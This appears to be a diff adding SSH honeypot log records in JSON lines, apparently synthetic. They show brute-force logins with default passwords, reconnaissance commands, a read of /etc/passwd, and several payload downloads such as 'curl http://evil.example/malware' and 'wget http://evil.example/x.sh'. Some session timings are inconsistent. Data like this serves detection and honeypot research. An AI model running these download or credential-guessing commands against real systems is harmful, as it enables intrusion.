+{"timestamp": "2026-11-19T08:21:59+00:00", "event": "command", "session_id": "19ac34fc", "src_ip": "45.148.10.32", "src_port": 53892, "command": "exit"}
+{"timestamp": "2026-11-19T08:22:01+00:00", "event": "session_end", "session_id": "19ac34fc", "src_ip": "45.148.10.32", "src_port": 53892, "username": "root", "duration_seconds": 29.65}
+{"timestamp": "2026-11-19T08:58:12+00:00", "event": "session_start", "session_id": "8f0d25ef", "src_ip": "159.65.44.201", "src_port": 34330, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-19T08:58:13+00:00", "event": "login_attempt", "session_id": "8f0d25ef", "src_ip": "159.65.44.201", "src_port": 34330, "username": "oracle", "password": "raspberry"}
+{"timestamp": "2026-11-19T08:58:15+00:00", "event": "login_attempt", "session_id": "8f0d25ef", "src_ip": "159.65.44.201", "src_port": 34330, "username": "user", "password": "12345678"}
+{"timestamp": "2026-11-19T08:58:17+00:00", "event": "login_attempt", "session_id": "8f0d25ef", "src_ip": "159.65.44.201", "src_port": 34330, "username": "test", "password": "letmein"}
+{"timestamp": "2026-11-19T08:58:22+00:00", "event": "command", "session_id": "8f0d25ef", "src_ip": "159.65.44.201", "src_port": 34330, "command": "whoami"}
+{"timestamp": "2026-11-19T08:58:37+00:00", "event": "command", "session_id": "8f0d25ef", "src_ip": "159.65.44.201", "src_port": 34330, "command": "exit"}
+{"timestamp": "2026-11-19T08:58:39+00:00", "event": "session_end", "session_id": "8f0d25ef", "src_ip": "159.65.44.201", "src_port": 34330, "username": "root", "duration_seconds": 30.8}
+{"timestamp": "2026-11-19T09:23:32+00:00", "event": "session_start", "session_id": "81207043", "src_ip": "45.148.10.32", "src_port": 59904, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-19T09:23:33+00:00", "event": "login_attempt", "session_id": "81207043", "src_ip": "45.148.10.32", "src_port": 59904, "username": "test", "password": "admin123"}
+{"timestamp": "2026-11-19T09:23:35+00:00", "event": "login_attempt", "session_id": "81207043", "src_ip": "45.148.10.32", "src_port": 59904, "username": "user", "password": "qwerty"}
+{"timestamp": "2026-11-19T09:23:37+00:00", "event": "login_attempt", "session_id": "81207043", "src_ip": "45.148.10.32", "src_port": 59904, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T09:23:42+00:00", "event": "command", "session_id": "81207043", "src_ip": "45.148.10.32", "src_port": 59904, "command": "pwd"}
+{"timestamp": "2026-11-19T09:23:57+00:00", "event": "command", "session_id": "81207043", "src_ip": "45.148.10.32", "src_port": 59904, "command": "exit"}
+{"timestamp": "2026-11-19T09:24:03+00:00", "event": "session_end", "session_id": "81207043", "src_ip": "45.148.10.32", "src_port": 59904, "username": "root", "duration_seconds": 31.36}
+{"timestamp": "2026-11-19T11:05:05+00:00", "event": "session_start", "session_id": "430ee7f2", "src_ip": "193.32.127.88", "src_port": 37908, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-19T11:05:06+00:00", "event": "login_attempt", "session_id": "430ee7f2", "src_ip": "193.32.127.88", "src_port": 37908, "username": "ubuntu", "password": "letmein"}
+{"timestamp": "2026-11-19T11:05:15+00:00", "event": "command", "session_id": "430ee7f2", "src_ip": "193.32.127.88", "src_port": 37908, "command": "pwd"}
+{"timestamp": "2026-11-19T11:05:30+00:00", "event": "command", "session_id": "430ee7f2", "src_ip": "193.32.127.88", "src_port": 37908, "command": "exit"}
+{"timestamp": "2026-11-19T11:05:34+00:00", "event": "session_end", "session_id": "430ee7f2", "src_ip": "193.32.127.88", "src_port": 37908, "username": "root", "duration_seconds": 11.65}
+{"timestamp": "2026-11-19T14:43:03+00:00", "event": "session_start", "session_id": "c77bcf5e", "src_ip": "103.75.190.14", "src_port": 48978, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-19T14:43:04+00:00", "event": "login_attempt", "session_id": "c77bcf5e", "src_ip": "103.75.190.14", "src_port": 48978, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T14:43:13+00:00", "event": "command", "session_id": "c77bcf5e", "src_ip": "103.75.190.14", "src_port": 48978, "command": "ls"}
+{"timestamp": "2026-11-19T14:43:16+00:00", "event": "command", "session_id": "c77bcf5e", "src_ip": "103.75.190.14", "src_port": 48978, "command": "curl http://evil.example/malware"}
+{"timestamp": "2026-11-19T14:43:25+00:00", "event": "session_end", "session_id": "c77bcf5e", "src_ip": "103.75.190.14", "src_port": 48978, "username": "root", "duration_seconds": 30.54}
+{"timestamp": "2026-11-19T14:43:28+00:00", "event": "command", "session_id": "c77bcf5e", "src_ip": "103.75.190.14", "src_port": 48978, "command": "exit"}
+{"timestamp": "2026-11-19T15:06:31+00:00", "event": "session_start", "session_id": "ba1a8fea", "src_ip": "185.220.101.7", "src_port": 37190, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T15:06:32+00:00", "event": "login_attempt", "session_id": "ba1a8fea", "src_ip": "185.220.101.7", "src_port": 37190, "username": "root", "password": "1234"}
+{"timestamp": "2026-11-19T15:06:41+00:00", "event": "command", "session_id": "ba1a8fea", "src_ip": "185.220.101.7", "src_port": 37190, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-19T15:06:44+00:00", "event": "command", "session_id": "ba1a8fea", "src_ip": "185.220.101.7", "src_port": 37190, "command": "whoami"}
+{"timestamp": "2026-11-19T15:06:56+00:00", "event": "command", "session_id": "ba1a8fea", "src_ip": "185.220.101.7", "src_port": 37190, "command": "exit"}
+{"timestamp": "2026-11-19T15:07:10+00:00", "event": "session_end", "session_id": "ba1a8fea", "src_ip": "185.220.101.7", "src_port": 37190, "username": "root", "duration_seconds": 21.02}
+{"timestamp": "2026-11-19T16:47:55+00:00", "event": "session_start", "session_id": "f5640b95", "src_ip": "45.148.10.32", "src_port": 33309, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-19T16:47:56+00:00", "event": "login_attempt", "session_id": "f5640b95", "src_ip": "45.148.10.32", "src_port": 33309, "username": "git", "password": "admin123"}
+{"timestamp": "2026-11-19T16:48:05+00:00", "event": "command", "session_id": "f5640b95", "src_ip": "45.148.10.32", "src_port": 33309, "command": "cat notes.txt"}
+{"timestamp": "2026-11-19T16:48:08+00:00", "event": "command", "session_id": "f5640b95", "src_ip": "45.148.10.32", "src_port": 33309, "command": "netstat -tulpn"}
+{"timestamp": "2026-11-19T16:48:11+00:00", "event": "command", "session_id": "f5640b95", "src_ip": "45.148.10.32", "src_port": 33309, "command": "netstat -tulpn"}
+{"timestamp": "2026-11-19T16:48:17+00:00", "event": "session_end", "session_id": "f5640b95", "src_ip": "45.148.10.32", "src_port": 33309, "username": "root", "duration_seconds": 23.27}
+{"timestamp": "2026-11-19T16:48:20+00:00", "event": "command", "session_id": "f5640b95", "src_ip": "45.148.10.32", "src_port": 33309, "command": "exit"}
+{"timestamp": "2026-11-19T16:55:30+00:00", "event": "session_start", "session_id": "89e5a932", "src_ip": "196.251.88.19", "src_port": 30820, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-19T16:55:31+00:00", "event": "login_attempt", "session_id": "89e5a932", "src_ip": "196.251.88.19", "src_port": 30820, "username": "support", "password": "qwerty"}
+{"timestamp": "2026-11-19T16:55:33+00:00", "event": "login_attempt", "session_id": "89e5a932", "src_ip": "196.251.88.19", "src_port": 30820, "username": "admin", "password": "oracle"}
+{"timestamp": "2026-11-19T16:55:35+00:00", "event": "login_attempt", "session_id": "89e5a932", "src_ip": "196.251.88.19", "src_port": 30820, "username": "test", "password": "oracle"}
+{"timestamp": "2026-11-19T16:55:59+00:00", "event": "session_end", "session_id": "89e5a932", "src_ip": "196.251.88.19", "src_port": 30820, "username": "root", "duration_seconds": 34.88}
+{"timestamp": "2026-11-19T17:52:31+00:00", "event": "session_start", "session_id": "69f06296", "src_ip": "104.244.79.12", "src_port": 59911, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-19T17:52:32+00:00", "event": "login_attempt", "session_id": "69f06296", "src_ip": "104.244.79.12", "src_port": 59911, "username": "guest", "password": "oracle"}
+{"timestamp": "2026-11-19T17:52:41+00:00", "event": "command", "session_id": "69f06296", "src_ip": "104.244.79.12", "src_port": 59911, "command": "id"}
+{"timestamp": "2026-11-19T17:52:44+00:00", "event": "command", "session_id": "69f06296", "src_ip": "104.244.79.12", "src_port": 59911, "command": "netstat -tulpn"}
+{"timestamp": "2026-11-19T17:52:47+00:00", "event": "command", "session_id": "69f06296", "src_ip": "104.244.79.12", "src_port": 59911, "command": "curl http://evil.example/malware"}
+{"timestamp": "2026-11-19T17:52:50+00:00", "event": "command", "session_id": "69f06296", "src_ip": "104.244.79.12", "src_port": 59911, "command": "whoami"}
+{"timestamp": "2026-11-19T17:52:53+00:00", "event": "session_end", "session_id": "69f06296", "src_ip": "104.244.79.12", "src_port": 59911, "username": "root", "duration_seconds": 18.25}
+{"timestamp": "2026-11-19T17:52:56+00:00", "event": "command", "session_id": "69f06296", "src_ip": "104.244.79.12", "src_port": 59911, "command": "exit"}
+{"timestamp": "2026-11-19T18:10:50+00:00", "event": "session_start", "session_id": "df1b3f00", "src_ip": "45.148.10.32", "src_port": 45498, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-19T18:10:51+00:00", "event": "login_attempt", "session_id": "df1b3f00", "src_ip": "45.148.10.32", "src_port": 45498, "username": "admin", "password": "oracle"}
+{"timestamp": "2026-11-19T18:11:00+00:00", "event": "command", "session_id": "df1b3f00", "src_ip": "45.148.10.32", "src_port": 45498, "command": "netstat -tulpn"}
+{"timestamp": "2026-11-19T18:11:15+00:00", "event": "command", "session_id": "df1b3f00", "src_ip": "45.148.10.32", "src_port": 45498, "command": "exit"}
+{"timestamp": "2026-11-19T18:11:30+00:00", "event": "session_end", "session_id": "df1b3f00", "src_ip": "45.148.10.32", "src_port": 45498, "username": "root", "duration_seconds": 34.52}
+{"timestamp": "2026-11-19T18:13:19+00:00", "event": "session_start", "session_id": "59b891d6", "src_ip": "193.32.127.88", "src_port": 51756, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-19T18:13:20+00:00", "event": "login_attempt", "session_id": "59b891d6", "src_ip": "193.32.127.88", "src_port": 51756, "username": "support", "password": "raspberry"}
+{"timestamp": "2026-11-19T18:13:29+00:00", "event": "command", "session_id": "59b891d6", "src_ip": "193.32.127.88", "src_port": 51756, "command": "cat notes.txt"}
+{"timestamp": "2026-11-19T18:13:32+00:00", "event": "command", "session_id": "59b891d6", "src_ip": "193.32.127.88", "src_port": 51756, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-19T18:13:35+00:00", "event": "command", "session_id": "59b891d6", "src_ip": "193.32.127.88", "src_port": 51756, "command": "id"}
+{"timestamp": "2026-11-19T18:13:44+00:00", "event": "command", "session_id": "59b891d6", "src_ip": "193.32.127.88", "src_port": 51756, "command": "exit"}
+{"timestamp": "2026-11-19T18:13:48+00:00", "event": "session_end", "session_id": "59b891d6", "src_ip": "193.32.127.88", "src_port": 51756, "username": "root", "duration_seconds": 12.54}
+{"timestamp": "2026-11-19T18:31:53+00:00", "event": "session_start", "session_id": "ed5f713d", "src_ip": "193.32.127.88", "src_port": 32839, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T18:31:54+00:00", "event": "login_attempt", "session_id": "ed5f713d", "src_ip": "193.32.127.88", "src_port": 32839, "username": "ubuntu", "password": "123123"}
+{"timestamp": "2026-11-19T18:31:56+00:00", "event": "login_attempt", "session_id": "ed5f713d", "src_ip": "193.32.127.88", "src_port": 32839, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T18:31:58+00:00", "event": "login_attempt", "session_id": "ed5f713d", "src_ip": "193.32.127.88", "src_port": 32839, "username": "oracle", "password": "root"}
+{"timestamp": "2026-11-19T18:32:03+00:00", "event": "command", "session_id": "ed5f713d", "src_ip": "193.32.127.88", "src_port": 32839, "command": "ps aux"}
+{"timestamp": "2026-11-19T18:32:06+00:00", "event": "command", "session_id": "ed5f713d", "src_ip": "193.32.127.88", "src_port": 32839, "command": "cat notes.txt"}
+{"timestamp": "2026-11-19T18:32:09+00:00", "event": "command", "session_id": "ed5f713d", "src_ip": "193.32.127.88", "src_port": 32839, "command": "id"}
+{"timestamp": "2026-11-19T18:32:18+00:00", "event": "command", "session_id": "ed5f713d", "src_ip": "193.32.127.88", "src_port": 32839, "command": "exit"}
+{"timestamp": "2026-11-19T18:32:30+00:00", "event": "session_end", "session_id": "ed5f713d", "src_ip": "193.32.127.88", "src_port": 32839, "username": "root", "duration_seconds": 5.3}
+{"timestamp": "2026-11-19T19:04:42+00:00", "event": "session_start", "session_id": "c2c6ec31", "src_ip": "103.75.190.14", "src_port": 33368, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T19:04:43+00:00", "event": "login_attempt", "session_id": "c2c6ec31", "src_ip": "103.75.190.14", "src_port": 33368, "username": "pi", "password": "test"}
+{"timestamp": "2026-11-19T19:04:45+00:00", "event": "login_attempt", "session_id": "c2c6ec31", "src_ip": "103.75.190.14", "src_port": 33368, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T19:05:07+00:00", "event": "session_end", "session_id": "c2c6ec31", "src_ip": "103.75.190.14", "src_port": 33368, "username": "root", "duration_seconds": 31.44}
+{"timestamp": "2026-11-19T21:02:32+00:00", "event": "session_start", "session_id": "da69ecd3", "src_ip": "103.75.190.14", "src_port": 46008, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T21:02:33+00:00", "event": "login_attempt", "session_id": "da69ecd3", "src_ip": "103.75.190.14", "src_port": 46008, "username": "root", "password": "password"}
+{"timestamp": "2026-11-19T21:02:35+00:00", "event": "login_attempt", "session_id": "da69ecd3", "src_ip": "103.75.190.14", "src_port": 46008, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-19T21:02:37+00:00", "event": "login_attempt", "session_id": "da69ecd3", "src_ip": "103.75.190.14", "src_port": 46008, "username": "test", "password": "root"}
+{"timestamp": "2026-11-19T21:02:42+00:00", "event": "command", "session_id": "da69ecd3", "src_ip": "103.75.190.14", "src_port": 46008, "command": "pwd"}
+{"timestamp": "2026-11-19T21:02:54+00:00", "event": "session_end", "session_id": "da69ecd3", "src_ip": "103.75.190.14", "src_port": 46008, "username": "root", "duration_seconds": 33.35}
+{"timestamp": "2026-11-19T21:02:57+00:00", "event": "command", "session_id": "da69ecd3", "src_ip": "103.75.190.14", "src_port": 46008, "command": "exit"}
+{"timestamp": "2026-11-19T21:25:49+00:00", "event": "session_start", "session_id": "e88625c4", "src_ip": "45.148.10.32", "src_port": 51003, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-19T21:25:50+00:00", "event": "login_attempt", "session_id": "e88625c4", "src_ip": "45.148.10.32", "src_port": 51003, "username": "pi", "password": "root"}
+{"timestamp": "2026-11-19T21:26:17+00:00", "event": "session_end", "session_id": "e88625c4", "src_ip": "45.148.10.32", "src_port": 51003, "username": "root", "duration_seconds": 34.16}
+{"timestamp": "2026-11-19T22:10:32+00:00", "event": "session_start", "session_id": "7cd78181", "src_ip": "45.155.205.233", "src_port": 47694, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-19T22:10:33+00:00", "event": "login_attempt", "session_id": "7cd78181", "src_ip": "45.155.205.233", "src_port": 47694, "username": "postgres", "password": "123456"}
+{"timestamp": "2026-11-19T22:10:52+00:00", "event": "session_end", "session_id": "7cd78181", "src_ip": "45.155.205.233", "src_port": 47694, "username": "root", "duration_seconds": 7.74}
+{"timestamp": "2026-11-19T23:36:44+00:00", "event": "session_start", "session_id": "a4a2ab55", "src_ip": "45.155.205.233", "src_port": 58167, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-19T23:36:45+00:00", "event": "login_attempt", "session_id": "a4a2ab55", "src_ip": "45.155.205.233", "src_port": 58167, "username": "ubuntu", "password": "password123"}
+{"timestamp": "2026-11-19T23:36:54+00:00", "event": "command", "session_id": "a4a2ab55", "src_ip": "45.155.205.233", "src_port": 58167, "command": "ls -la"}
+{"timestamp": "2026-11-19T23:36:57+00:00", "event": "command", "session_id": "a4a2ab55", "src_ip": "45.155.205.233", "src_port": 58167, "command": "pwd"}
+{"timestamp": "2026-11-19T23:37:09+00:00", "event": "command", "session_id": "a4a2ab55", "src_ip": "45.155.205.233", "src_port": 58167, "command": "exit"}
+{"timestamp": "2026-11-19T23:37:21+00:00", "event": "session_end", "session_id": "a4a2ab55", "src_ip": "45.155.205.233", "src_port": 58167, "username": "root", "duration_seconds": 11.74}
+{"timestamp": "2026-11-19T23:44:32+00:00", "event": "session_start", "session_id": "cfcf5ed5", "src_ip": "185.220.101.7", "src_port": 51753, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-19T23:44:33+00:00", "event": "login_attempt", "session_id": "cfcf5ed5", "src_ip": "185.220.101.7", "src_port": 51753, "username": "ubuntu", "password": "oracle"}
+{"timestamp": "2026-11-19T23:44:42+00:00", "event": "command", "session_id": "cfcf5ed5", "src_ip": "185.220.101.7", "src_port": 51753, "command": "uname -a"}
+{"timestamp": "2026-11-19T23:44:57+00:00", "event": "command", "session_id": "cfcf5ed5", "src_ip": "185.220.101.7", "src_port": 51753, "command": "exit"}
+{"timestamp": "2026-11-19T23:45:07+00:00", "event": "session_end", "session_id": "cfcf5ed5", "src_ip": "185.220.101.7", "src_port": 51753, "username": "root", "duration_seconds": 23.34}
+{"timestamp": "2026-11-20T00:19:28+00:00", "event": "session_start", "session_id": "d533ff70", "src_ip": "91.240.118.101", "src_port": 58863, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-20T00:19:29+00:00", "event": "login_attempt", "session_id": "d533ff70", "src_ip": "91.240.118.101", "src_port": 58863, "username": "git", "password": "test"}
+{"timestamp": "2026-11-20T00:19:38+00:00", "event": "command", "session_id": "d533ff70", "src_ip": "91.240.118.101", "src_port": 58863, "command": "curl http://evil.example/malware"}
+{"timestamp": "2026-11-20T00:19:53+00:00", "event": "command", "session_id": "d533ff70", "src_ip": "91.240.118.101", "src_port": 58863, "command": "exit"}
+{"timestamp": "2026-11-20T00:20:01+00:00", "event": "session_end", "session_id": "d533ff70", "src_ip": "91.240.118.101", "src_port": 58863, "username": "root", "duration_seconds": 7.8}
+{"timestamp": "2026-11-20T02:59:15+00:00", "event": "session_start", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-20T02:59:16+00:00", "event": "login_attempt", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "username": "admin", "password": "password"}
+{"timestamp": "2026-11-20T02:59:18+00:00", "event": "login_attempt", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-20T02:59:20+00:00", "event": "login_attempt", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "username": "git", "password": "ubuntu"}
+{"timestamp": "2026-11-20T02:59:25+00:00", "event": "command", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "command": "uname -a"}
+{"timestamp": "2026-11-20T02:59:28+00:00", "event": "command", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "command": "curl http://evil.example/malware"}
+{"timestamp": "2026-11-20T02:59:31+00:00", "event": "command", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "command": "hostname"}
+{"timestamp": "2026-11-20T02:59:34+00:00", "event": "command", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "command": "cat notes.txt"}
+{"timestamp": "2026-11-20T02:59:40+00:00", "event": "command", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "command": "exit"}
+{"timestamp": "2026-11-20T02:59:41+00:00", "event": "session_end", "session_id": "5bb9b2f0", "src_ip": "45.148.10.32", "src_port": 31898, "username": "root", "duration_seconds": 26.39}
+{"timestamp": "2026-11-20T03:49:27+00:00", "event": "session_start", "session_id": "3d10718b", "src_ip": "103.75.190.14", "src_port": 49864, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-20T03:49:28+00:00", "event": "login_attempt", "session_id": "3d10718b", "src_ip": "103.75.190.14", "src_port": 49864, "username": "postgres", "password": "admin"}
+{"timestamp": "2026-11-20T03:49:37+00:00", "event": "command", "session_id": "3d10718b", "src_ip": "103.75.190.14", "src_port": 49864, "command": "cat /etc/passwd"}
+{"timestamp": "2026-11-20T03:49:40+00:00", "event": "command", "session_id": "3d10718b", "src_ip": "103.75.190.14", "src_port": 49864, "command": "ls -la"}
+{"timestamp": "2026-11-20T03:49:49+00:00", "event": "session_end", "session_id": "3d10718b", "src_ip": "103.75.190.14", "src_port": 49864, "username": "root", "duration_seconds": 33.47}
+{"timestamp": "2026-11-20T03:49:52+00:00", "event": "command", "session_id": "3d10718b", "src_ip": "103.75.190.14", "src_port": 49864, "command": "exit"}
+{"timestamp": "2026-11-20T04:04:25+00:00", "event": "session_start", "session_id": "5405f77a", "src_ip": "45.148.10.32", "src_port": 38773, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-20T04:04:26+00:00", "event": "login_attempt", "session_id": "5405f77a", "src_ip": "45.148.10.32", "src_port": 38773, "username": "postgres", "password": "password123"}
+{"timestamp": "2026-11-20T04:04:35+00:00", "event": "command", "session_id": "5405f77a", "src_ip": "45.148.10.32", "src_port": 38773, "command": "whoami"}
+{"timestamp": "2026-11-20T04:04:38+00:00", "event": "command", "session_id": "5405f77a", "src_ip": "45.148.10.32", "src_port": 38773, "command": "id"}
+{"timestamp": "2026-11-20T04:04:41+00:00", "event": "command", "session_id": "5405f77a", "src_ip": "45.148.10.32", "src_port": 38773, "command": "whoami"}
+{"timestamp": "2026-11-20T04:04:44+00:00", "event": "command", "session_id": "5405f77a", "src_ip": "45.148.10.32", "src_port": 38773, "command": "uname -a"}
+{"timestamp": "2026-11-20T04:04:50+00:00", "event": "command", "session_id": "5405f77a", "src_ip": "45.148.10.32", "src_port": 38773, "command": "exit"}
+{"timestamp": "2026-11-20T04:05:02+00:00", "event": "session_end", "session_id": "5405f77a", "src_ip": "45.148.10.32", "src_port": 38773, "username": "root", "duration_seconds": 21.17}
+{"timestamp": "2026-11-20T06:04:39+00:00", "event": "session_start", "session_id": "88e236e7", "src_ip": "103.75.190.14", "src_port": 40286, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-20T06:04:40+00:00", "event": "login_attempt", "session_id": "88e236e7", "src_ip": "103.75.190.14", "src_port": 40286, "username": "test", "password": "raspberry"}
+{"timestamp": "2026-11-20T06:04:42+00:00", "event": "login_attempt", "session_id": "88e236e7", "src_ip": "103.75.190.14", "src_port": 40286, "username": "pi", "password": "letmein"}
+{"timestamp": "2026-11-20T06:04:49+00:00", "event": "command", "session_id": "88e236e7", "src_ip": "103.75.190.14", "src_port": 40286, "command": "netstat -tulpn"}
+{"timestamp": "2026-11-20T06:04:52+00:00", "event": "command", "session_id": "88e236e7", "src_ip": "103.75.190.14", "src_port": 40286, "command": "cat notes.txt"}
+{"timestamp": "2026-11-20T06:04:55+00:00", "event": "command", "session_id": "88e236e7", "src_ip": "103.75.190.14", "src_port": 40286, "command": "whoami"}
+{"timestamp": "2026-11-20T06:04:58+00:00", "event": "command", "session_id": "88e236e7", "src_ip": "103.75.190.14", "src_port": 40286, "command": "ps aux"}
+{"timestamp": "2026-11-20T06:05:04+00:00", "event": "command", "session_id": "88e236e7", "src_ip": "103.75.190.14", "src_port": 40286, "command": "exit"}
+{"timestamp": "2026-11-20T06:05:17+00:00", "event": "session_end", "session_id": "88e236e7", "src_ip": "103.75.190.14", "src_port": 40286, "username": "root", "duration_seconds": 14.03}
+{"timestamp": "2026-11-20T07:31:11+00:00", "event": "session_start", "session_id": "3f4d17e2", "src_ip": "193.32.127.88", "src_port": 31683, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-20T07:31:12+00:00", "event": "login_attempt", "session_id": "3f4d17e2", "src_ip": "193.32.127.88", "src_port": 31683, "username": "guest", "password": "password"}
+{"timestamp": "2026-11-20T07:31:14+00:00", "event": "login_attempt", "session_id": "3f4d17e2", "src_ip": "193.32.127.88", "src_port": 31683, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-20T07:31:16+00:00", "event": "login_attempt", "session_id": "3f4d17e2", "src_ip": "193.32.127.88", "src_port": 31683, "username": "user", "password": "123123"}
+{"timestamp": "2026-11-20T07:31:18+00:00", "event": "login_attempt", "session_id": "3f4d17e2", "src_ip": "193.32.127.88", "src_port": 31683, "username": "ubuntu", "password": "password"}
+{"timestamp": "2026-11-20T07:31:21+00:00", "event": "command", "session_id": "3f4d17e2", "src_ip": "193.32.127.88", "src_port": 31683, "command": "hostname"}
+{"timestamp": "2026-11-20T07:31:24+00:00", "event": "command", "session_id": "3f4d17e2", "src_ip": "193.32.127.88", "src_port": 31683, "command": "curl http://evil.example/malware"}
+{"timestamp": "2026-11-20T07:31:36+00:00", "event": "command", "session_id": "3f4d17e2", "src_ip": "193.32.127.88", "src_port": 31683, "command": "exit"}
+{"timestamp": "2026-11-20T07:31:43+00:00", "event": "session_end", "session_id": "3f4d17e2", "src_ip": "193.32.127.88", "src_port": 31683, "username": "root", "duration_seconds": 18.52}
+{"timestamp": "2026-11-20T08:10:37+00:00", "event": "session_start", "session_id": "8fc65c2d", "src_ip": "178.128.90.55", "src_port": 39802, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-20T08:10:38+00:00", "event": "login_attempt", "session_id": "8fc65c2d", "src_ip": "178.128.90.55", "src_port": 39802, "username": "guest", "password": "admin123"}
+{"timestamp": "2026-11-20T08:10:40+00:00", "event": "login_attempt", "session_id": "8fc65c2d", "src_ip": "178.128.90.55", "src_port": 39802, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-20T08:10:47+00:00", "event": "command", "session_id": "8fc65c2d", "src_ip": "178.128.90.55", "src_port": 39802, "command": "cat notes.txt"}
+{"timestamp": "2026-11-20T08:10:50+00:00", "event": "command", "session_id": "8fc65c2d", "src_ip": "178.128.90.55", "src_port": 39802, "command": "id"}
+{"timestamp": "2026-11-20T08:10:53+00:00", "event": "command", "session_id": "8fc65c2d", "src_ip": "178.128.90.55", "src_port": 39802, "command": "ls"}
+{"timestamp": "2026-11-20T08:11:02+00:00", "event": "command", "session_id": "8fc65c2d", "src_ip": "178.128.90.55", "src_port": 39802, "command": "exit"}
+{"timestamp": "2026-11-20T08:11:09+00:00", "event": "session_end", "session_id": "8fc65c2d", "src_ip": "178.128.90.55", "src_port": 39802, "username": "root", "duration_seconds": 13.23}
+{"timestamp": "2026-11-20T09:58:03+00:00", "event": "session_start", "session_id": "faa83b71", "src_ip": "212.102.35.118", "src_port": 43046, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-20T09:58:04+00:00", "event": "login_attempt", "session_id": "faa83b71", "src_ip": "212.102.35.118", "src_port": 43046, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-20T09:58:13+00:00", "event": "command", "session_id": "faa83b71", "src_ip": "212.102.35.118", "src_port": 43046, "command": "ls"}
+{"timestamp": "2026-11-20T09:58:28+00:00", "event": "command", "session_id": "faa83b71", "src_ip": "212.102.35.118", "src_port": 43046, "command": "exit"}
+{"timestamp": "2026-11-20T09:58:33+00:00", "event": "session_end", "session_id": "faa83b71", "src_ip": "212.102.35.118", "src_port": 43046, "username": "root", "duration_seconds": 12.31}
+{"timestamp": "2026-11-20T12:30:29+00:00", "event": "session_start", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-20T12:30:30+00:00", "event": "login_attempt", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "username": "ubuntu", "password": "test"}
+{"timestamp": "2026-11-20T12:30:32+00:00", "event": "login_attempt", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "username": "pi", "password": "123456"}
+{"timestamp": "2026-11-20T12:30:34+00:00", "event": "login_attempt", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "username": "pi", "password": "1234"}
+{"timestamp": "2026-11-20T12:30:36+00:00", "event": "login_attempt", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-20T12:30:39+00:00", "event": "command", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "command": "pwd"}
+{"timestamp": "2026-11-20T12:30:42+00:00", "event": "command", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-20T12:30:45+00:00", "event": "command", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "command": "pwd"}
+{"timestamp": "2026-11-20T12:30:54+00:00", "event": "command", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "command": "exit"}
+{"timestamp": "2026-11-20T12:31:05+00:00", "event": "session_end", "session_id": "ffb529c8", "src_ip": "91.240.118.101", "src_port": 40544, "username": "root", "duration_seconds": 32.31}
